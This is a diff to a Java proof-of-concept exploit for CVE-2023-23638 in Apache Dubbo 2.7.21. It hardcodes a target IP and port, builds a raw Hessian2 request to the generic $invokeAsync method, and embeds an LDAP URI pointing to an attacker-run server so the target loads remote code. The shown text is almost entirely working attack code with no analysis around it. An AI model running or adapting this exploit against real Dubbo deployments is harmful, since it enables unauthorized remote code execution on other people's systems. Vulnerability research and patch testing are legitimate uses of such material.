@@ -10,13 +10,19 @@ import java.net.Socket;
 import java.util.HashMap;
 import java.util.Random;
 
+/**
+ * 测试版本: dubbo 2.7.21
+ * 修复版本: dubbo 2.7.22
+ */
+public class CVE_2023_23638 {
 
-public class CVE_2023_23638_1 {
+    static Boolean False = false;
+    static String dubbo_ip = "10.58.120.200";
+    static int dubbo_port = 20880;
+    static String ldapUri = "ldap://10.58.120.200:1389/fg4e1a";
 
-    public static Boolean False = false;
+
     public static void main(String[] args) throws Exception{
-
-        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
 
         // header.
         byte[] header = new byte[16];
@@ -27,32 +33,31 @@ public class CVE_2023_23638_1 {
 
         // set request id.
         Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
-        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
-        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);
+        ByteArrayOutputStream bodyBaos = new ByteArrayOutputStream();
+        Hessian2ObjectOutput body = new Hessian2ObjectOutput(bodyBaos);
 
         // set body
-        out.writeUTF("2.7.6");
-        //todo 此处填写Dubbo提供的服务名
-        out.writeUTF("com.pacemrc.dubbo.api.DemoService");
-        out.writeUTF("");
-        out.writeUTF("$invokeAsync");
-        out.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
-        //todo 此处填写Dubbo提供的服务的方法
-        out.writeUTF("sayHello");
-        out.writeObject(new String[] {"java.lang.String"});
+        body.writeUTF("2.7.6");
+        body.writeUTF("com.pacemrc.dubbo.api.DemoService");
+        body.writeUTF("");
+        body.writeUTF("$invokeAsync");
+        body.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
 
-        getRawReturnPayload(out, "ldap://10.58.120.200:1389/nco5cx");
+        body.writeUTF("sayHello");
+        body.writeObject(new String[] {"java.lang.String"});
 
-        out.flushBuffer();
+        getRawReturnPayload(body, ldapUri);
 
-        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
-        byteArrayOutputStream.write(header);
-        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());
+        body.flushBuffer();
 
-        byte[] bytes = byteArrayOutputStream.toByteArray();
+        Bytes.int2bytes(bodyBaos.size(), header, 12);
+        ByteArrayOutputStream totalBaos = new ByteArrayOutputStream();
+        totalBaos.write(header);
+        totalBaos.write(bodyBaos.toByteArray());
 
-        //todo 此处填写Dubbo服务地址及端口
-        Socket socket = new Socket("10.58.120.200", 20880);
+        byte[] bytes = totalBaos.toByteArray();
+
+        Socket socket = new Socket(dubbo_ip, dubbo_port);
         OutputStream outputStream = socket.getOutputStream();
         outputStream.write(bytes);
         outputStream.flush();
